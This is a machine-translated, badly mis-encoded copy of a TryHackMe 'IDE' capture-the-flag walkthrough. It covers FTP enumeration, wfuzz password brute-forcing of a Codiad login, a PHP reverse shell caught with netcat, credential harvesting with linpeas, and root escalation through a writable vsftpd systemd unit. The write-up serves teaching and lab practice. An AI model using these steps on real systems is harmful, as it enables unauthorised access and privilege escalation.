<html>
<head>
<title>TryHackMe â€” IDE</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe-IDE</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/tryhackme-ide-15ea67a44bc9?source=collection_archive---------3-----------------------#2022-01-25">https://infosecwriteups.com/tryhackme-ide-15ea67a44bc9?source=collection_archive---------3-----------------------#2022-01-25</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="c152" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">å—¨ï¼Œä¼™è®¡ä»¬ï¼Œåˆå’Œç‰¹é‡Œå“ˆå…‹å§†withç©å¾—å¼€å¿ƒäº†ã€‚æ‰€ä»¥ï¼Œè¿™é‡Œæ˜¯é€šè¿‡è¿™ä¸ª<strong class="js iu"> IDE </strong>æŒ‘æˆ˜çš„è®°å½•å’ŒæŒ‡å—ã€‚è¿™é—´CTFå®¢æˆ¿æ˜¯ç”±CTFçˆ±å¥½è€…ä¸ºCTFçˆ±å¥½è€…è®¾è®¡çš„ã€‚</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div class="gh gi ko"><img src="../Images/2f4b04416304326fea513dc6f4d3a8fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1024/format:webp/0*B6C_shMvogXQ8Cl6.png"/></div></figure><p id="5339" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><strong class="js iu">æˆ¿é—´</strong>:<a class="ae kw" href="https://tryhackme.com/room/ide" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/ide</a><br/><strong class="js iu">å…³å¡</strong>:è½»æ¾</p><p id="eec7" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><strong class="js iu">ä»»åŠ¡</strong>:æ‰“ç£¨ä½ æšä¸¾æŠ€èƒ½çš„ç®€æ˜“ç›’å­ï¼è·å¾—ä¸€ä¸ªå¤–å£³å¹¶å‡çº§æ‚¨çš„æƒé™ï¼</p><h1 id="89e2" class="kx ky it bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">æˆ‘ä»¬å¼€å§‹å§</h1><p id="7702" class="pw-post-body-paragraph jq jr it js b jt lv jv jw jx lw jz ka kb lx kd ke kf ly kh ki kj lz kl km kn im bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œå¯åŠ¨æœºå™¨ï¼Œåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€IP</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi ma"><img src="../Images/286f95d3921e36d44299128599dc71c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y1ljawQ5IPSmu52ABFslqg.png"/></div></div></figure><p id="a658" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">ä¸å¯»å¸¸ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿è¡Œ<code class="fe mf mg mh mi b">nmap</code>æ¥æ£€æŸ¥åœ¨å…¶ä»–ç«¯å£ä¸Šè¿è¡Œçš„ä»»ä½•ç³»ç»Ÿ</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="33dd" class="mn ky it mi b gy mo mp l mq mr">&gt; nmap -A -T4 -sS -sV -p- 10.10.223.165<br/>PORT      STATE SERVICE VERSION</span><span id="a1ae" class="mn ky it mi b gy ms mp l mq mr"><strong class="mi iu">21/tcp    open  ftp     vsftpd 3.0.3<br/>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</strong><br/>| ftp-syst:<br/>|   STAT:<br/>| FTP server status:<br/>|      Connected to ::ffff:10.8.163.74<br/>|      Logged in as ftp<br/>|      TYPE: ASCII<br/>|      No session bandwidth limit<br/>|      Session timeout in seconds is 300<br/>|      Control connection is plain text<br/>|      Data connections will be plain text<br/>|      At session startup, client count was 4<br/>|      vsFTPd 3.0.3 - secure, fast, stable<br/>|_End of status<br/>22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey:<br/>|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)<br/>|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)<br/>|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)<br/>80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))<br/>|_http-title: Apache2 Ubuntu Default Page: It works<br/>|_http-server-header: Apache/2.4.29 (Ubuntu)<br/><strong class="mi iu">62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</strong><br/>|<strong class="mi iu">_http-title: Codiad 2.8.4</strong><br/>|_http-server-header: Apache/2.4.29 (Ubuntu)</span><span id="744a" class="mn ky it mi b gy ms mp l mq mr">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><span id="ad05" class="mn ky it mi b gy ms mp l mq mr">....<br/>....</span></pre><p id="5370" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">åœ¨è¿™é‡Œæ‰¾åˆ°2ä¸ªæœ‰è¶£çš„åŒ¹é…ã€‚FTPéƒ¨åˆ†å¯ä»¥åŒ¿åè®¿é—®ã€‚ä½¿ç”¨Cyberduckå’Œæµè§ˆæœåŠ¡å™¨</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mt"><img src="../Images/a8456874cfc076e0677fde1493790b82.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EU3zxrW_6Ft26LPYBV73Wg.png"/></div></div></figure><p id="7820" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">æ‰¾åˆ°ä¸€ä¸ªæ²¡æœ‰æ‰©å±•åçš„æ–‡ä»¶ã€‚ä¸‹è½½å¹¶æ‰“å¼€å®ƒ</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="3ff1" class="mn ky it mi b gy mo mp l mq mr">Hey <strong class="mi iu">john</strong>,<br/>I have reset the password as you have asked. <strong class="mi iu">Please use the default password to login. </strong><br/>Also, please take care of the image file ;)<br/>- <strong class="mi iu">drac</strong>.</span></pre><p id="d3f9" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">æ®è¯´dracæŠŠjohnçš„å¯†ç é‡ç½®æˆäº†é»˜è®¤å¯†ç ã€‚å› ä¸ºFTPé˜»æ­¢ä»»ä½•ä¸œè¥¿ä¸Šä¼ ï¼Œæ‰€ä»¥åªéœ€è®°ä¸‹å¹¶ç»§ç»­</p><p id="5678" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">è®©æˆ‘ä»¬çœ‹çœ‹TCPç«¯å£62337</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mu"><img src="../Images/c8f9346e697aaabcbce2a83de86593b8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sfnz7OPPxpqQLMrfjF7Mvg.png"/></div></div></figure><p id="c498" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">è¿™æ˜¯ç™»å½•é¡µé¢ã€‚è¡¨å•æ­£åœ¨å‘æ­¤ç«¯ç‚¹å‘é€è¯·æ±‚</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="f3af" class="mn ky it mi b gy mo mp l mq mr"><a class="ae kw" href="http://10.10.223.165:62337/components/user/controller.php\?action\=authenticate" rel="noopener ugc nofollow" target="_blank">http://10.10.X.X:62337/components/user/controller.php\?action\=authenticate</a></span></pre><p id="e191" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">ä½¿ç”¨sqlmapæŸ¥çœ‹SQLæ³¨å…¥æ˜¯å¦å­˜åœ¨æ¼æ´</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="328d" class="mn ky it mi b gy mo mp l mq mr">&gt; sqlmap --forms -u http://10.10.X.X:62337/ --risk=3 --level=3 --random-agent -p "username"</span></pre><p id="dde4" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">ä¸è¦ã€‚å¤ªä¹…å¾—ä¸åˆ°ç»“æœã€‚å†³å®šç”¨<code class="fe mf mg mh mi b">wfuzz</code>ã€‚ä½¿ç”¨â€œjohnâ€ä½œä¸ºç”¨æˆ·åï¼Œä½¿ç”¨éšæœºå¯†ç è¿è¡Œwfuzzï¼Œå› ä¸ºæ³¨é‡Šæ˜¾ç¤ºjohnæ˜¯ç³»ç»Ÿç”¨æˆ·ä¹‹ä¸€</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="259d" class="mn ky it mi b gy mo mp l mq mr">&gt; wfuzz -c -Z -w wordlists/rockyou.txt --sc 200 -d "username=john&amp;password=FUZZ" <a class="ae kw" href="http://10.10.223.165:62337/components/user/controller.php\?action\=authenticate" rel="noopener ugc nofollow" target="_blank">http://10.10.X.X:62337/components/user/controller.php\?action\=authenticate</a></span><span id="eadd" class="mn ky it mi b gy ms mp l mq mr">====================================================================<br/>ID           Response   Lines    Word       Chars       Payload<br/>====================================================================<br/>..... <br/>000000008:   200        0 L      4 W        61 Ch       "rockyou"<br/>000000005:   200        0 L      4 W        61 Ch       "iloveyou"<br/>000000051:   200        0 L      4 W        61 Ch       "amanda"<br/><strong class="mi iu">000000004:   200        0 L      1 W        47 Ch       "XXXXXXXX"</strong><br/>.....</span></pre><p id="6b61" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">å“‡å“¦..â€œé»˜è®¤å¯†ç â€æ˜¯æŒ‡XXXXXXXã€‚ğŸ˜‚æ²¡å¬æ¸…æ¥šã€‚ç„¶åï¼Œæˆ‘ä»¬å°±å¯ä»¥æˆåŠŸç™»å½•äº†</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mv"><img src="../Images/90a085ec51db86f08a0f07150558be70.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ohcNiZCgLy8oglVKxEwOcQ.png"/></div></div></figure><p id="55d6" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">å®ƒæ˜¾ç¤ºäº†ä¸€ç§ä¸æ˜¯å½“å‰è¿è¡Œç³»ç»Ÿçš„ä»£ç ç¼–è¾‘å™¨ã€‚ä½†æ˜¯ï¼Œæœ‰ä¸€ä¸ªæŒ‰é’®ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºå¦ä¸€ä¸ªé¡¹ç›®ã€‚è®©æˆ‘ä»¬è¯•ç€åˆ›é€ ä¸€äº›ä¸œè¥¿ã€‚</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mw"><img src="../Images/fe891e8f9d319096d0161030ca6370a1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JAcQlXhDxNmbuQ6iwd0vJg.png"/></div></div></figure><p id="5350" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">ä¸å¹¸çš„æ˜¯ï¼Œæœ‰ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯â€œç»å¯¹è·¯å¾„åªå…è®¸ç”¨äº/var/www/html/codiad/homeâ€ã€‚</p><p id="a1c6" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">è¡Œ..å°†ç»å¯¹è·¯å¾„å€¼æ›´æ”¹ä¸º<code class="fe mf mg mh mi b">/var/www/html/codiad</code>ã€‚ç‚¹å‡»åˆ›å»ºï¼Œçªç„¶æ˜¾ç¤ºå½“å‰è¿è¡Œç³»ç»Ÿçš„æ•´ä¸ªé¡¹ç›®ä»£ç ã€‚</p><figure class="kp kq kr ks gt kt gh gi paragraph-image"><div role="button" tabindex="0" class="mb mc di md bf me"><div class="gh gi mx"><img src="../Images/94ad6c9c7fcc6bf1aa4b001c896f24d7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rQ4B2pYvKvi12U5OBM84HA.png"/></div></div></figure><p id="cb84" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><code class="fe mf mg mh mi b">index.php</code>æ˜¯ç™»å½•ç”¨æˆ·ç•Œé¢å‘ç”Ÿçš„åœ°æ–¹ã€‚æœ‰è¶£çš„æ˜¯ï¼Œå®ƒå¯ä»¥åœ¨é‡Œé¢åˆ›å»ºä»»ä½•æ–‡ä»¶ã€‚ğŸ¤«ã€‚å³é”®å•å‡»æ ¹æ–‡ä»¶å¤¹å¹¶åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚æˆ‘ç»™å®ƒâ€œ<strong class="js iu">reverse.php</strong>â€ï¼Œå¹¶å°†åå‘å¤–å£³ä»£ç æ”¾å…¥æ–‡ä»¶ä¸­ã€‚é€šè¿‡æµè§ˆå™¨<code class="fe mf mg mh mi b">/reverse.php</code>æ‰“å¼€æ–‡ä»¶ï¼Œé€šè¿‡ç»ˆç«¯ç›‘å¬</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="b1de" class="mn ky it mi b gy mo mp l mq mr">&gt; nc -nlvp 4444<br/>Connection from XXXXXXXXXXXXXXXXXX<br/>Linux ide 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux<br/>07:04:14 up  1:34,  0 users,  load average: 0.00, 0.00, 0.00<br/>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/>/bin/sh: 0: can't access tty; job control turned off<br/>$</span></pre><p id="4e21" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">Tadaï¼ä»¥www-dataç”¨æˆ·çš„èº«ä»½è®¿é—®æœåŠ¡å™¨ã€‚æµè§ˆä¸ªäººæ–‡ä»¶å¤¹</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="9a4f" class="mn ky it mi b gy mo mp l mq mr">&gt; ls -al /home<br/>drwxr-xr-x  3 root root 4096 Jun 17  2021 .<br/>drwxr-xr-x 24 root root 4096 Jul  9  2021 ..<br/>drwxr-xr-x  6 drac drac 4096 Aug  4 07:06 drac</span><span id="c3eb" class="mn ky it mi b gy ms mp l mq mr">&gt; ls -al /home/drac<br/>drwx------ 3 drac drac 4096 Jun 18  2021 .local<br/>-rw-r--r-- 1 drac drac  807 Apr  4  2018 .profile<br/>-rw-r--r-- 1 drac drac    0 Jun 17  2021 .sudo_as_admin_successful<br/>-rw------- 1 drac drac  557 Jun 18  2021 .xsession-errors<br/><strong class="mi iu">-r-------- 1 drac drac   33 Jun 18  2021 user.txt</strong></span></pre><p id="94a0" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">æ‰¾åˆ°äº†æ ‡å¿—â€¦ä½†åªèƒ½ç”±<strong class="js iu"> drac </strong>è¯»å–ã€‚<code class="fe mf mg mh mi b">sudo -l</code>ä¸ä¼šç»™å‡ºä»»ä½•ä¿¡æ¯ã€‚æˆ‘ä¸èƒ½ç”¨ä¹å¤´è›‡æ¥ç ´è§£<strong class="js iu"> drac </strong>å¯†ç ï¼Œå› ä¸ºM1ä¸æ”¯æŒã€‚æˆ‘éœ€è¦æ‰¾åˆ°å¦ä¸€ç§æ–¹æ³•</p><p id="b495" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">æˆ‘ä»¬åœ¨é¡¹ç›®ä¸­ä¸Šä¼ <code class="fe mf mg mh mi b">linpeas</code>shellï¼Œä»ç»ˆç«¯æ‰§è¡Œæ€ä¹ˆæ ·ï¼Ÿå“ˆå“ˆå“ˆï¼ä¸‹è½½<code class="fe mf mg mh mi b">linpeas.sh</code>ã€‚å¤åˆ¶ä»£ç å¹¶ç²˜è´´åˆ°ä»£ç ç¼–è¾‘å™¨ä¸­ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°æ‰¾åˆ°linpeas shellå¹¶æ‰§è¡Œå®ƒ</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="e86b" class="mn ky it mi b gy mo mp l mq mr">&gt; cd /var/www/codiad<br/>&gt; sh linpeas.sh<br/>....<br/>....<br/><strong class="mi iu">â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching passwords in history files<br/>mysql</strong> -u drac -p 'XXXXXXXXXXXXXXXX'<strong class="mi iu"><br/>....<br/>....</strong></span></pre><p id="fe3b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">æ‰¾åˆ°äº†dracç”¨äºMysqlçš„å¯†ç ã€‚ä½†æ˜¯å¦‚æœdracåœ¨SSHä¸­ä½¿ç”¨ç›¸åŒçš„å¯†ç å‘¢ï¼Ÿè®©æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="158e" class="mn ky it mi b gy mo mp l mq mr">&gt; ssh drac@10.10.X.X</span><span id="6e67" class="mn ky it mi b gy ms mp l mq mr">drac@10.10.223.165's password:<br/><strong class="mi iu">drac@ide</strong>:<strong class="mi iu">~</strong>$ </span><span id="6d11" class="mn ky it mi b gy ms mp l mq mr">&gt; cat user.txt<br/>XXXXXXXXXXXXXXXXX</span></pre><p id="f429" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">è¿™ä¸SSHä½¿ç”¨çš„å¯†ç ç›¸åŒã€‚ç°åœ¨ï¼Œæˆ‘ä»¬æˆåŠŸç™»å½•å¹¶æ‰¾åˆ°äº†ç¬¬ä¸€é¢æ——å¸œã€‚ç°åœ¨æ˜¯æ ¹æ——ã€‚é¦–å…ˆï¼Œ</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="3885" class="mn ky it mi b gy mo mp l mq mr">&gt; sudo -l</span><span id="0e25" class="mn ky it mi b gy ms mp l mq mr">Matching Defaults entries for drac on ide:<br/>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br/>User drac may run the following commands on ide:<br/><strong class="mi iu">(ALL : ALL) /usr/sbin/service vsftpd restart</strong></span></pre><p id="4402" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">å› æ­¤ï¼Œå¯ä»¥é€šè¿‡dracä½¿ç”¨sudoæ¥æ‰§è¡ŒæœåŠ¡å‘½ä»¤ã€‚æåˆ°GTFObinsï¼Œ</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="7487" class="mn ky it mi b gy mo mp l mq mr">&gt; sudo service ../../bin/sh</span><span id="818a" class="mn ky it mi b gy ms mp l mq mr">Sorry, user drac is not allowed to execute '/usr/sbin/service ../../bin/sh' as root on ide.</span></pre><p id="1ddd" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">æ— æ³•è¿è¡Œå‘½ä»¤ï¼Œå› ä¸ºsudoå‘½ä»¤ä»…é™äº<code class="fe mf mg mh mi b">vsftpd</code>æœåŠ¡ã€‚æ— éœ€ä¸ºå¯»æ‰¾æç¤ºè€Œå¤´ç–¼ï¼Œåªéœ€å†æ¬¡è¿è¡Œlinpeasï¼Œ</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="ea10" class="mn ky it mi b gy mo mp l mq mr"><strong class="mi iu">....<br/>....<br/>â•”â•â•â•â•â•â•â•â•â•â•â•£ Interesting GROUP writable files (not in Home) (max500)<br/>â•š </strong><a class="ae kw" href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files" rel="noopener ugc nofollow" target="_blank"><strong class="mi iu"><em class="my">https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files</em></strong></a><strong class="mi iu"><em class="my"><br/></em></strong>Group <strong class="mi iu">drac:<br/>/lib/systemd/system/vsftpd.service<br/></strong>....<br/>....</span></pre><p id="bfe7" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">å‘ç°<code class="fe mf mg mh mi b">vsftpd</code>æœåŠ¡å¯ç”±dracå†™å…¥ï¼Œå¹¶ç”±rootæ‹¥æœ‰ã€‚æ‰“å¼€æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°â€œExecStartâ€å¯ä»¥åœ¨é‚£é‡Œè¿è¡Œå‘½ä»¤ã€‚æ—¢ç„¶æˆ‘çš„ç›´è§‰å‘Šè¯‰æˆ‘CTFæ ¹æ——çš„å¤§éƒ¨åˆ†ä½äº<code class="fe mf mg mh mi b">root/root.txt</code>ã€‚æ‰€ä»¥ï¼Œåªéœ€æŠŠbashå‘½ä»¤è¾“å‡ºçš„æ ¹æ ‡å¿—çš„å†…å®¹æ”¾åˆ°æ ¹ç³»ç»Ÿç›®å½•ä¸‹ã€‚</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="adb3" class="mn ky it mi b gy mo mp l mq mr">[Unit]<br/>Description=vsftpd FTP server<br/>After=network.target</span><span id="6c76" class="mn ky it mi b gy ms mp l mq mr">[Service]<br/>Type=simple<br/>ExecStart=/bin/sh -c "cat /root/root.txt &gt; /root.txt"<br/>ExecReload=/bin/kill -HUP $MAINPID<br/>ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty</span><span id="1716" class="mn ky it mi b gy ms mp l mq mr">[Install]<br/>WantedBy=multi-user.target</span></pre><p id="3d95" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">ä¿å­˜å¹¶å°è¯•é‡æ–°å¯åŠ¨æœåŠ¡</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="8d3d" class="mn ky it mi b gy mo mp l mq mr">&gt; sudo /usr/sbin/service vsftpd restart<br/><strong class="mi iu">Warning:</strong> The unit file, source configuration file or drop-ins of vsftpd.service changed on disk. Run 'systemctl daemon-reload' to reload units.</span></pre><p id="bc1b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">åªè¦å¬ä»è­¦å‘Šï¼Œ</p><pre class="kp kq kr ks gt mj mi mk ml aw mm bi"><span id="f129" class="mn ky it mi b gy mo mp l mq mr">&gt; systemctl daemon-reload<br/>&gt; sudo /usr/sbin/service vsftpd restart</span><span id="244e" class="mn ky it mi b gy ms mp l mq mr">&gt; cat /root.txt<br/>XXXXXXXXXXXXXXXX</span></pre><p id="fd5f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">æ‰¾åˆ°æœ€åä¸€é¢æ——å¸œï¼ï¼</p><p id="e59f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">æ„Ÿè°¢æ‚¨çš„é˜…è¯»ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹å¦ä¸€ç¯‡æ–‡ç« ã€‚ğŸ¤˜</p></div><div class="ab cl mz na hx nb" role="separator"><span class="nc bw bk nd ne nf"/><span class="nc bw bk nd ne nf"/><span class="nc bw bk nd ne"/></div><div class="im in io ip iq"><p id="146b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">ğŸ”ˆğŸ”ˆ<strong class="js iu"> Infosec Writeupsæ­£åœ¨ç»„ç»‡å…¶é¦–æ¬¡è™šæ‹Ÿä¼šè®®å’Œç½‘ç»œæ´»åŠ¨ã€‚å¦‚æœä½ å¯¹ä¿¡æ¯å®‰å…¨æ„Ÿå…´è¶£ï¼Œè¿™æ˜¯æœ€é…·çš„åœ°æ–¹ï¼Œæœ‰16ä¸ªä»¤äººéš¾ä»¥ç½®ä¿¡çš„æ¼”è®²è€…å’Œ10å¤šä¸ªå°æ—¶å……æ»¡åŠ›é‡çš„è®¨è®ºä¼šè®®ã€‚</strong> <a class="ae kw" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank"> <strong class="js iu">æŸ¥çœ‹æ›´å¤šè¯¦æƒ…å¹¶åœ¨æ­¤æ³¨å†Œã€‚</strong> </a></p><div class="ng nh gp gr ni nj"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="nk ab fo"><div class="nl ab nm cl cj nn"><h2 class="bd iu gy z fp no fr fs np fu fw is bi translated">IWCon2022 - Infosecä¹¦é¢æŠ¥å‘Šè™šæ‹Ÿä¼šè®®</h2><div class="nq l"><h3 class="bd b gy z fp no fr fs np fu fw dk translated">ä¸ä¸–ç•Œä¸Šæœ€ä¼˜ç§€çš„ä¿¡æ¯å®‰å…¨ä¸“å®¶å»ºç«‹è”ç³»ã€‚äº†è§£ç½‘ç»œå®‰å…¨ä¸“å®¶å¦‚ä½•å–å¾—æˆåŠŸã€‚å°†æ–°æŠ€èƒ½æ·»åŠ åˆ°æ‚¨çš„â€¦</h3></div><div class="nr l"><p class="bd b dl z fp no fr fs np fu fw dk translated">iwcon.live</p></div></div><div class="ns l"><div class="nt l nu nv nw ns nx ku nj"/></div></div></a></div></div></div>    
</body>
</html>